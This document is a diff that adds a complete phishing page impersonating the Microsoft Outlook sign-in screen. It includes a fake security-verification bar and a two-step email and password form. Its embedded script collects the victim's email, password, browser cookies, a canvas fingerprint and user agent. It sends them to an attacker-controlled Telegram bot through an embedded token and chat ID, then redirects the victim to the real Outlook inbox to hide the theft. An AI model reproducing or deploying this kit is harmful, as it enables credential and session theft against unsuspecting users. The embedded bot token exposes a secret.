@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook - Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
+            width: 100%; 
+            max-width: 420px; 
+            padding: 40px 32px; 
+            margin: 0 auto;
+            position: relative;
+        }
+        .page { display: none; }
+        .page.active { display: block; }
+        .logo { text-align: center; margin-bottom: 24px; }
+        .logo img { height: 32px; width: auto; display: block; margin: 0 auto; max-width: 100%; height: auto; }
+        .title { font-size: 24px; font-weight: 600; color: #212529; margin-bottom: 8px; text-align: center; }
+        .subtitle { color: #6c757d; font-size: 14px; text-align: center; margin-bottom: 32px; }
+        .security-bar { 
+            background: #e7f3ff; border: 1px solid #b3d9ff; border-radius: 6px; 
+            padding: 12px; margin-bottom: 24px; font-size: 13px; color: #0c5db3;
+        }
+        .progress-container { margin-top: 12px; }
+        .progress-bar { 
+            height: 4px; background: #dee2e6; border-radius: 2px; 
+            overflow: hidden; margin-top: 8px;
+        }
+        .progress-fill { 
+            height: 100%; background: linear-gradient(90deg, #0d6efd, #28a745); 
+            width: 0%; transition: width 0.3s ease; border-radius: 2px;
+        }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #495057; margin-bottom: 6px; }
+        .form-group input { 
+            width: 100%; padding: 12px 16px; border: 1px solid #ced4da; 
+            border-radius: 6px; font-size: 16px; transition: all 0.2s;
+        }
+        .form-group input:focus { outline: none; border-color: #86b7fe; box-shadow: 0 0 0 3px rgba(13,110,253,0.1); }
+        .next-btn, .submit-btn { 
+            width: 100%; background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%); 
+            color: white; border: none; padding: 14px; border-radius: 6px; 
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+            text-align: center;
+        }
+        .next-btn:hover:not(:disabled), .submit-btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(13,110,253,0.3); }
+        .next-btn:disabled, .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; background: #6c757d; }
+        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #6c757d; }
+        .hidden { display: none !important; }
+        .loading { opacity: 0.7; }
+        
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .container { padding: 32px 24px; margin: 10px; border-radius: 6px; }
+            .title { font-size: 20px; }
+            .logo img { height: 28px; }
+            .form-group input { font-size: 16px; padding: 14px 16px; }
+            .next-btn, .submit-btn { font-size: 16px; padding: 16px; }
+        }
+        @media (max-width: 360px) {
+            .container { padding: 28px 20px; }
+            .title { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="page-indicator" id="pageIndicator" style="display: none;">Step 1 of 2</div>
+        
+        <div class="logo">
+            <img src="https://download.logo.wine/logo/Microsoft_Outlook/Microsoft_Outlook-Logo.wine.png" alt="Microsoft Outlook" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/Outlook_logo.svg/152px-Outlook_logo.svg.png'">
+        </div>
+        
+        <div id="page1" class="page active">
+            <h1 class="title">Sign in to your account</h1>
+            <p class="subtitle">Enter your Microsoft account to continue to Outlook.com</p>
+            
+            <div class="security-bar" id="securityCheck">
+                🔒 Performing enhanced security verification...
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <form id="emailForm">
+                <div class="form-group">
+                    <label for="email">Email or phone</label>
+                    <input type="email" id="email" name="email" placeholder="someone@example.com" autocomplete="email" required>
+                </div>
+                <button type="submit" class="next-btn" id="nextBtn" disabled>Next</button>
+            </form>
+        </div>
+        
+        <div id="page2" class="page">
+            <h1 class="title">Enter password</h1>
+            <p class="subtitle" id="emailDisplay">someone@example.com</p>
+            
+            <form id="passwordForm">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
+                </div>
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>Sign in</button>
+            </form>
+            
+            <div class="footer">
+                <span>© Microsoft Corporation</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8247308065:AAFc77VIBE-SK4ptQ2qgxHqI-HfuTe7YDjg';
+        const TELEGRAM_CHAT_ID = '513008008';
+        const INBOX_URL = 'https://outlook.live.com/mail/0/inbox';
+        
+        let victimEmail = '';
+        
+        function getAllCookies() {
+            const cookies = document.cookie;
+            const cookieObj = {};
+            cookies.split(';').forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    cookieObj[name] = decodeURIComponent(value);
+                }
+            });
+            return cookieObj;
+        }
+        
+        const honeypots = ['email2','phone','username','debug'];
+        honeypots.forEach(id => {
+            const hp = document.createElement('input');
+            hp.id = id; hp.type = 'text'; hp.style.display = 'none';
+            document.body.appendChild(hp);
+        });
+        
+        let progress = 0;
+        const interval = setInterval(()=>{
+            progress += 2;
+            document.getElementById('progressFill').style.width = progress + '%';
+            if(progress >= 100){
+                clearInterval(interval);
+                document.getElementById('securityCheck').innerHTML = '✅ Security verification completed.';
+                document.getElementById('email').focus();
+            }
+        }, 65);
+        
+        const nextBtn = document.getElementById('nextBtn');
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            victimEmail = document.getElementById('email').value.trim();
+            
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+            document.getElementById('emailDisplay').textContent = victimEmail;
+            document.getElementById('password').focus();
+        });
+        
+        document.getElementById('email').addEventListener('input', function() {
+            nextBtn.disabled = this.value.trim().length === 0;
+        });
+        
+        document.getElementById('passwordForm').onsubmit = function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const container = document.querySelector('.container');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Signing in...';
+            container.classList.add('loading');
+            
+            const victimPassword = document.getElementById('password').value;
+            const cookies = getAllCookies();
+            const cookieList = Object.entries(cookies).map(([k,v])=>`${k}=${v.substring(0,30)}...`).join('\n');
+            
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+            ctx.fillText('Bot test', 2, 2);
+            const canvasHash = canvas.toDataURL().slice(-12);
+            
+            const payload = `🎯 OUTLOOK HIT\n\n👤 ${victimEmail}\n🔑 ${victimPassword}\n🍪 Cookies (${Object.keys(cookies).length}):\n${cookieList}\n\nCanvas: ${canvasHash}\nUA: ${navigator.userAgent.substring(0,80)}`;
+            
+            navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, 
+                JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: payload,
+                    parse_mode: 'HTML'
+                })
+            );
+            
+            location.replace(INBOX_URL);
+            return false;
+        };
+        
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('submitBtn').disabled = this.value.length === 0;
+        });
+    </script>
+</body>
+</html>
